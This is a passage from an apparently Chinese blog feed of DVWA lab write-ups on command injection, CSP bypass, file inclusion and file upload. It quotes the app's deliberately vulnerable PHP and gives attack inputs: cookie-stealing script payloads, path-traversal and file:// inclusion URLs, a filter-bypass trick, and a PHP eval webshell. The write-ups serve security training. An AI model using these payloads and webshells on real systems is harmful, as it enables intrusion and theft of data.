<span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( <span class="title function_ invoke__">sizeof</span>( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) {</span><br><span class="line">            <span class="comment">// If all 4 octets are int's put the IP back together.</span></span><br><span class="line">            <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">'.'</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">'.'</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">'.'</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line">            <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">            <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) {</span><br><span class="line">                <span class="comment">// Windows</span></span><br><span class="line">                <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">'ping  '</span> . <span class="variable">$target</span> );</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">else</span> {</span><br><span class="line">                <span class="comment">// *nix</span></span><br><span class="line">                <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">'ping  -c 4 '</span> . <span class="variable">$target</span> );</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// Feedback for the end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;<span class="subst">{$cmd}</span>&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p>
]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>Command Injection</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA Content Security Policy (CSP) Bypass</title>
    <url>/DVWA-Content-Security-Policy-CSP-Bypass.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CSP(Content Security Policy，内容安全策略）是一种用来防止XSS攻击的手段，通过在头部Content-Security-Policy 的相关参数，来限制未知（不信任）来源的JavaScript脚本的执行，从而达到防止xss攻击的目的。<span id="more"></span></p>
<p>一般的xss攻击，主要是通过利用函数过滤/转义输入中的特殊字符、标签、文本来应对攻击。</p>
<p>CSP则是另外一种常用的应对XSS攻击的策略。其实质就是白名单机制，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。</p>
<h1 id="CSP启动方式"><a href="#CSP启动方式" class="headerlink" title="CSP启动方式"></a>CSP启动方式</h1><ol>
<li><p>通过 HTTP 响应头信息的Content-Security-Policy字段</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">content-security-policy：script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';  </span><br></pre></td></tr></table></figure>

<ul>
<li>  ‘none’:代表空集；即不匹配任何 URL。两侧单引号是必须的。</li>
<li>  ‘self’:代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。</li>
<li>  ‘unsafe-inline’:允许使用内联资源，如内联的 <code>&lt;script&gt;</code> 元素、<code>javascript:URL</code>、内联的事件处理函数和内联的 <code>&lt;style&gt;</code> 元素。两侧单引号是必须的。</li>
<li>  ‘unsafe-eval’:允许使用 eval() 等通过字符串创建代码的方法。两侧单引号是必须的。</li>
</ul>
</li>
<li><p>通过网页的标签</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self'; object-src 'none';	style-src example.org third-party.org; child-src https:"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>  script-src：脚本：只信任当前域名。</li>
<li>  object-src：不信任任何URL，即不加载任何资源。</li>
<li>  style-src样式表：只信任example.org和third-party.org。</li>
<li>  child-src：必须使用HTTPS协议加载。这个已从Web标准中删除，新版本浏览器可能不支持。</li>
</ul>
</li>
</ol>
<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$headerCSP</span> = <span class="string">"Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;"</span>; <span class="comment">// allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="variable">$headerCSP</span>);</span><br><span class="line">    <span class="comment"># These might work if you can't create your own for some reason</span></span><br><span class="line">    <span class="comment"># https://pastebin.com/raw/R570EE00</span></span><br><span class="line">    <span class="comment"># https://hastebin.com/raw/ohulaquzex</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">'include'</span>])) {</span><br><span class="line">    <span class="variable">$page</span>[ <span class="string">'body'</span> ] .= <span class="string">"</span></span><br><span class="line"><span class="string">        &lt;script src='"</span> . <span class="variable">$_POST</span>[<span class="string">'include'</span>] . <span class="string">"'&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    "</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="variable">$page</span>[ <span class="string">'body'</span> ] .= <span class="string">'</span></span><br><span class="line"><span class="string">    &lt;form name="csp" method="POST"&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;input size="50" type="text" name="include" value="" id="include" /&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="submit" value="Include" /&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    '</span>;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>允许的脚本来源：<code>self</code>、<code>https://pastebin.com</code>、<code>example.com</code>、<code>code.jquery.com</code>、<code>https://ssl.google-analytics.com</code>；</p>
<p>在pastebin网站上写一个JavaScript代码<code>alert(document.cookie);</code>，链接为<a href="https://pastebin.com/WpR2dJxB%EF%BC%8C%E5%9C%A8%E7%95%8C%E9%9D%A2%E4%B8%AD%E8%BE%93%E5%85%A5%E8%BF%99%E4%B8%AA%E9%93%BE%E6%8E%A5%EF%BC%8C%E7%90%86%E8%AE%BA%E4%B8%8A%E5%8F%AF%E4%BB%A5%E5%BC%B9%E5%87%BAcookie%E5%80%BC%EF%BC%8C%E4%BD%86%E6%98%AF%E5%AE%9E%E9%99%85%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%E4%B8%AD%E6%97%A0%E6%B3%95%E5%BC%B9%E5%87%BAcookie%EF%BC%8C%E7%9B%AE%E5%89%8D%E8%BF%98%E6%9C%AA%E6%89%BE%E5%88%B0%E5%8E%9F%E5%9B%A0%EF%BC%9B">https://pastebin.com/WpR2dJxB，在界面中输入这个链接，理论上可以弹出cookie值，但是实际操作过程中无法弹出cookie，目前还未找到原因；</a></p>
<h1 id="MIEDIUM"><a href="#MIEDIUM" class="headerlink" title="MIEDIUM"></a>MIEDIUM</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$headerCSP</span> = <span class="string">"Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';"</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="variable">$headerCSP</span>);</span><br><span class="line">    <span class="comment">// Disable XSS protections so that inline alert boxes will work</span></span><br><span class="line">    <span class="title function_ invoke__">header</span> (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line">    <span class="comment"># &lt;script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA="&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">'include'</span>])) {</span><br><span class="line">    <span class="variable">$page</span>[ <span class="string">'body'</span> ] .= <span class="string">"</span></span><br><span class="line"><span class="string">        "</span> . <span class="variable">$_POST</span>[<span class="string">'include'</span>] . <span class="string">"</span></span><br><span class="line"><span class="string">    "</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="variable">$page</span>[ <span class="string">'body'</span> ] .= <span class="string">'</span></span><br><span class="line"><span class="string">    &lt;form name="csp" method="POST"&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;input size="50" type="text" name="include" value="" id="include" /&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="submit" value="Include" /&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    '</span>;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>只允许<code>self</code>、<code>unsafe-inline</code>的js脚本。<br> <code>'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA='</code>指的是，允许内联的脚本，并且必须带有nonce值，比如<code>&lt;script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA="&gt;alert(document.cookie)&lt;/script&gt;</code>，就会弹出弹框。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201124020333.png"></p>
<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$headerCSP</span> = <span class="string">"Content-Security-Policy: script-src 'self';"</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="variable">$headerCSP</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">'include'</span>])) {</span><br><span class="line">    <span class="variable">$page</span>[ <span class="string">'body'</span> ] .= <span class="string">"</span></span><br><span class="line"><span class="string">        "</span> . <span class="variable">$_POST</span>[<span class="string">'include'</span>] . <span class="string">"</span></span><br><span class="line"><span class="string">    "</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="variable">$page</span>[ <span class="string">'body'</span> ] .= <span class="string">'</span></span><br><span class="line"><span class="string">    &lt;form name="csp" method="POST"&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;The page makes a call to '</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="string">'/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;1+2+3+4+5=&lt;span id="answer"&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="button" id="solve" value="Solve the sum" /&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;script src="source/high.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    '</span>;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>允许<code>self</code>的脚本执行，<code>self</code>是指本页面加载的脚本。</p>
<p>可以使用用post方式提交如下脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>=&lt;script src=<span class="string">"source/jsonp.php?callback=alert(document.cookie);"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201124020854.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201124020820.png"></p>
<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$headerCSP</span> = <span class="string">"Content-Security-Policy: script-src 'self';"</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="variable">$headerCSP</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">'include'</span>])) {</span><br><span class="line">    <span class="variable">$page</span>[ <span class="string">'body'</span> ] .= <span class="string">"</span></span><br><span class="line"><span class="string">        "</span> . <span class="variable">$_POST</span>[<span class="string">'include'</span>] . <span class="string">"</span></span><br><span class="line"><span class="string">    "</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="variable">$page</span>[ <span class="string">'body'</span> ] .= <span class="string">'</span></span><br><span class="line"><span class="string">    &lt;form name="csp" method="POST"&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;1+2+3+4+5=&lt;span id="answer"&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="button" id="solve" value="Solve the sum" /&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;script src="source/impossible.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    '</span>;</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>直接把执行的js代码写在了php文件中。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/weixin_40950781/article/details/99991677">https://blog.csdn.net/weixin_40950781/article/details/99991677</a></p>
<p><a href="https://www.jianshu.com/p/59b748f0f046">https://www.jianshu.com/p/59b748f0f046</a></p>
]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>CSP Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA File Inclusion</title>
    <url>/DVWA-File-Inclusion.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>File Inclusion文件包含，是指当服务器开启<code>allow_url_include</code>选项时，可以通过php的某些特性数<code>include()</code>、<code>require()</code>、 <code>include_once()</code>、<code>require_once()</code>利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。<span id="more"></span></p>
<h2 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h2><ul>
<li><p>  <strong>LFI</strong>:本地文件包含(Local File Inclusion)</p>
</li>
<li><p><strong>RFI</strong>:远程文件包含(Remote File Inclusion)</p>
<p>  远程文件包含漏洞是因为开启了php配置中的<code>allow_url_fopen</code>选项，选项开启之后，服务器允许包含一个远程的文件。 </p>
</li>
</ul>
<h2 id="与文件包含有关的函数"><a href="#与文件包含有关的函数" class="headerlink" title="与文件包含有关的函数"></a>与文件包含有关的函数</h2><ul>
<li>  <code>include()</code>：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。</li>
<li>  <code>include_once()</code>：和 include()功能相同，区别在于当重复调用同一文件时，程序只调用一次。</li>
<li>  <code>require()</code>：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。</li>
<li>  <code>require_once()</code>：和 require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。</li>
</ul>
<h2 id="相关的-php-ini-配置参数"><a href="#相关的-php-ini-配置参数" class="headerlink" title="相关的 php.ini 配置参数"></a>相关的 php.ini 配置参数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">allow_url_fopen = on （默认开启）</span><br><span class="line">allow_url_include = on （默认关闭）</span><br></pre></td></tr></table></figure>

<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="comment">// The page we wish to display</span></span><br><span class="line">		<span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">'page'</span> ];</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>服务器端对page参数没有做任何的过滤跟检查。</p>
<p>服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。</p>
<p>服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行。</p>
<p>如果文件内容确为php，则会正常执行并返回结果；</p>
<p>如果不是，则会原封不动地打印文件内容；</p>
<p>因此文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
<p>文件包含漏洞常常会导致任意文件读取与任意命令执行。现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。</p>
<h2 id="攻击测试"><a href="#攻击测试" class="headerlink" title="攻击测试"></a>攻击测试</h2><p>点击file1.php，观察到url为：<code>http://localhost/DVWA/vulnerabilities/fi/?page=file1.php</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201120162945.png"></p>
<p>利用漏洞构造url：<code>http://localhost/DVWA/vulnerabilities/fi/?page=/Users/leeyuxun/WWW/dvwa/php.ini</code>（绝对路径）</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201120163304.png"></p>
<p>也可以构造url相对路径：<code>http://localhost/DVWA/vulnerabilities/fi/?page=/?page=../../php.ini</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201120163720.png"></p>
<h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// The page we wish to display</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">'page'</span> ];</span><br><span class="line">    <span class="comment">// Input validation</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>( <span class="keyword">array</span>( <span class="string">"http://"</span>, <span class="string">"https://"</span> ), <span class="string">""</span>, <span class="variable">$file</span> );</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>( <span class="keyword">array</span>( <span class="string">"../"</span>, <span class="string">"..\""</span> ), <span class="string">""</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>增加了<code>str_replace()</code>函数，对page参数进行了一定的处理，将<code>http://</code>、<code>https://</code>、<code>../</code>、<code>..\</code>替换为空字符，只是过滤了远程包含，但没有过滤本地包含，可以使用本地绝对路径进行攻击；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201120163304.png"></p>
<p><strong>注意</strong>：使用<code>str_replace()</code>函数是极其不安全的，可以使用<strong>双写绕过</strong>替换规则。例如<code>page=htthttp://p://</code>时，<code>str_replace()</code>函数会将<code>http://</code>删除，于是<code>page=http://</code>，成功执行远程命令；</p>
<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// The page we wish to display</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">'page'</span> ];</span><br><span class="line">    <span class="comment">// Input validation</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="title function_ invoke__">fnmatch</span>( <span class="string">"file*"</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">"include.php"</span> ) {</span><br><span class="line">        <span class="comment">// This isn't the page we want!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件；<br>代码规定只能包含file开头的文件，不过可以利用file协议绕过防护策略；</p>
<p>利用漏洞构造url：<code>http://localhost/DVWA/vulnerabilities/fi/?page=file:///Users/leeyuxun/WWW/dvwa/php.ini</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201120165554.png"></p>
<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// The page we wish to display</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">'page'</span> ];</span><br><span class="line">    <span class="comment">// Only allow include.php or file{1..3}.php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$file</span> != <span class="string">"include.php"</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">"file1.php"</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">"file2.php"</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">"file3.php"</span> ) {</span><br><span class="line">        <span class="comment">// This isn't the page we want!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>使用了<strong>白名单机制</strong>进行防护，page参数必须为<code>include.php</code>、<code>file1.php</code>、<code>file2.php</code>、<code>file3.php</code>之一，彻底杜绝了文件包含漏洞。</p>
]]></content>
      <categories>
        <category>DVWA</category>
      </categories>
      <tags>
        <tag>File Inclusion</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA File Upload</title>
    <url>/DVWA-File-Upload.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件上传漏洞通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，文件上传漏洞带来的危害常常是毁灭性的。<span id="more"></span></p>
<h2 id="文件上传漏洞的利用的条件"><a href="#文件上传漏洞的利用的条件" class="headerlink" title="文件上传漏洞的利用的条件"></a>文件上传漏洞的利用的条件</h2><ol>
<li> 能够成功上传木马文件</li>
<li> 上传文件必须能够被执行</li>
<li> 上传文件的路径必须可知</li>
</ol>
<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'Upload'</span> ] ) ) {</span><br><span class="line">        <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">        <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">        <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], <span class="variable">$target_path</span> ) ) {</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;<span class="subst">{$target_path}</span> succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>分析：</p>
<p>函数介绍：<br><code>basename()</code>函数返回路径中的文件名部分。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">basename</span> ( <span class="keyword">string</span> <span class="variable">$path</span> [, <span class="keyword">string</span> <span class="variable">$suffix</span> ] )</span><br></pre></td></tr></table></figure>

<p>参数介绍：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>$path</td>
<td>必需，规定要检查的路径，在Windows中，斜线（/）和反斜线（\）都可以用作目录分隔符。在其它环境下是斜线（/）</td>
</tr>
<tr>
<td>$suffix</td>
<td>可选，规定文件扩展名，如果文件有suffix，则不会输出这个扩展名</td>
</tr>
</tbody></table>
<h2 id="攻击测试"><a href="#攻击测试" class="headerlink" title="攻击测试"></a>攻击测试</h2><p>构造webshell如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">'shell'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201120211628.png"></p>
<p>使用蚁剑连接后，getshell完成；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201120212021.png"></p>
<h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">'Upload'</span> ] ) ) {</span><br><span class="line">        <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">        <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">        <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line">        <span class="comment">// File information</span></span><br><span class="line">        <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">        <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">        <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line">        <span class="comment">// Is it an image?</span></span><br><span class="line">        <span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">"image/jpeg"</span> || <span class="variable">$uploaded_type</span> == <span class="string">"image/png"</span> ) &amp;&amp;</span><br><span class="line">            ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) {</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">            <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], <span 